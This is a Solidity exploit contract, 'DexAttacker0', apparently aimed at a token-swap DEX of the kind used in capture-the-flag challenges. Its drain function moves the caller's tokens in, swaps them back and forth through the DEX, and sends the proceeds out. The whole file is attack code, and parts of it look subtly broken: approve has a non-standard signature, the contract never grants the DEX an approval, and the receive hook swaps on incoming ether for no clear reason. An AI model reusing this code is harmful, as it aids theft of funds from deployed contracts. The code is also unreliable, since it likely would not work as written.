pragma solidity ^0.8.0;

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function approve(address owner, address spender, uint256 amount) external;
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IDex {
    function token1() external view returns (address);
    function token2() external view returns (address);
    function swap(address from, address to, uint256 amount) external;
    function approve(address owner, address spender, uint256 amount) external;
}

contract DexAttacker0 {
    address public dex;
    address public token1;
    address public token2;

    constructor(address _dex) {
        dex = _dex;
        token1 = IDex(_dex).token1();
        token2 = IDex(_dex).token2();
    }

    function drain() external {
        IERC20(token1).transferFrom(msg.sender, address(this), 1000);
        IERC20(token2).transferFrom(msg.sender, address(this), 1000);
        swapAll(token1, token2);
        swapAll(token2, token1);
        IERC20(token1).transfer(msg.sender, IERC20(token1).balanceOf(address(this)));
        IERC20(token2).transfer(msg.sender, IERC20(token2).balanceOf(address(this)));
    }

    function swapAll(address from, address to) private {
        uint256 fromBalance = IERC20(from).balanceOf(address(this));
        IDex(dex).swap(from, to, fromBalance);
    }

    receive() external payable {
        if (IERC20(token2).balanceOf(address(this)) > 0) {
            swapAll(token2, token1);
        }
    }

    function approveSpender(uint256 amount) external {
        IDex(dex).approve(msg.sender, address(this), amount);
    }
}
